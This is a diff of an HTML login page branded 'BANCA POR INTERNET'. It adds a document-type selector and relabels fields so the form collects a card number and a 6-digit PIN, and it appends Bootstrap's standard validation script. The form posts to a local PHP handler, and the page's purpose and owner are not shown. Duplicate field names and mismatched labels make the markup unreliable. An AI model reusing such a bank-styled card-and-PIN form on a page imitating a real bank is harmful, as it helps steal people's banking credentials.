@@ -18,25 +18,41 @@
         <div class="container">
           <div class="row">
             <div class="col-md-9 col-lg-8 mx-auto">
-              <h3 class="login-heading mb-4">BANCA POR INTERNET</h3>
+              <h3 class="login-heading mb-4 text-center p-5">BANCA POR INTERNET</h3>
   
-              <!-- Sign In Form -->
+        
               <form action="servidor/login/logear.php" method="post">
-                <div class="form-floating mb-5">
+
+
+                <div class="input-group mb-5">
+                  <div class="input-group-prepend">
+                    <select class="form-select" id="basic-addon1">
+                    <option value="1">DNI</option>
+                    <option value="2">CE</option>
+                    <option value="3">PAS</option>
+                  </select>
+                  </div>
+                  <input type="text" class="form-control" placeholder="Nro Documento" aria-label="Username" aria-describedby="basic-addon1">
+                </div>
+                  
+
+                <div class="form-floating mb-5 ">
                   <input type="text" class="form-control" name="usuario" id="usuario" placeholder="Usuario">
-                  <label for="usuario">DNI</label>
+                  <label for="usuario">Numero de Tarjeta</label>
                 </div>
                 <div class="form-floating mb-5">
                   <input type="password" class="form-control" name="password" id="password" placeholder="Password">
-                  <label for="text">Numero de Tarjeta</label>
+                  <label for="number">Clave de 6 Digitos</label>
                 </div>
                 <div class="form-floating mb-5">
                     <input type="password" class="form-control" name="password" id="password" placeholder="Password">
-                    <label for="password">Clave de 6 Digitos</label>
+                    <label for="password">CAPTCHA</label>
                   </div>
+
                 <div class="d-grid">
-                  <button class="btn btn-lg btn-primary btn-login text-uppercase fw-bold mb-2" type="submit">Continuar</button>
+                  <button type="submit" class="btn btn-lg btn-primary btn-login text-uppercase fw-bold mb-2">Continuar</button>
                 </div>
+
               </form>
             </div>
           </div>
@@ -47,6 +63,27 @@
 </div>
     
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
-    
+            <script>
+              // Example starter JavaScript for disabling form submissions if there are invalid fields
+        (function () {
+          'use strict'
+
+          // Fetch all the forms we want to apply custom Bootstrap validation styles to
+          var forms = document.querySelectorAll('.needs-validation')
+
+          // Loop over them and prevent submission
+          Array.prototype.slice.call(forms)
+            .forEach(function (form) {
+              form.addEventListener('submit', function (event) {
+                if (!form.checkValidity()) {
+                  event.preventDefault()
+                  event.stopPropagation()
+                }
+
+                form.classList.add('was-validated')
+              }, false)
+            })
+        })()
+            </script>
   </body>
 </html>
